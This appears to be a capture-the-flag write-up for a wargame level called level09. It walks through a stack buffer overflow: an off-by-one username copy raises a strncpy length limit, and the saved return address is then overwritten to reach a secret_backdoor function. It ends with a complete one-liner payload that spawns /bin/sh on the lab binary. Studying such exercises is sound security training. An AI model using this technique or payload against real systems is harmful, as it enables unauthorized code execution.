# level09

This level is a classic buffer overflow return address attack.

We have 2 inputs: the first one is the username, the second is the message sent.

## Objective

We want to redirect the function `void handle_msg()` return into the backdoor function named `void secret_backdoor()`.

## Path

We're gonna overflow the buffer `char buffer[140] = {0};`
using `strncpy(buffer, message, msg_len);`

Since it's a `strncpy`, there is a limit that is set here: `int msg_len = *(int *)(buffer + 180);`

And this is where we initialize the `msg_len`: `*(int *)(buffer + 180) = 140;`

Since our buffer is 140 long, we cannot perform a return address attack if this value stays the same.

### Change the limit of strncpy

In the input of the username, we saw this:

```c
for (int i = 0; i <= 40 && username[i]; i++) {
    buffer[140 + i] = username[i];
}
```

Our limit is set at buffer + 180, and here we write from buffer + 140 up to buffer + 180.

So we have one character that could change the value of 140. In our case, we want more. The largest byte is \xff, so we just have to put 40 padding characters and \xff to change the 140 to 255.



### Find the return address

Now that we can overflow the buffer, we can find the offset (200). Now we want to change the value of the return address to the backdoor function!

64-bit function
Since this level is on a 64-bit system, we don't have a 4-byte address but an 8-byte one!

To find this address, we have to use:

```bash
    gdb
    b main
    print secret_backdoor
```
This difference in addresses when using GDB comes from position-independent executables (PIE) being loaded into memory.

## Finnaly

We just have to execute system("our_input"), so /bin/sh is working !

`(python -c 'print "A" * 40 + "\xff"'; python -c 'print "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; python -c 'print "/bin/sh"'; cat) | ./level09`
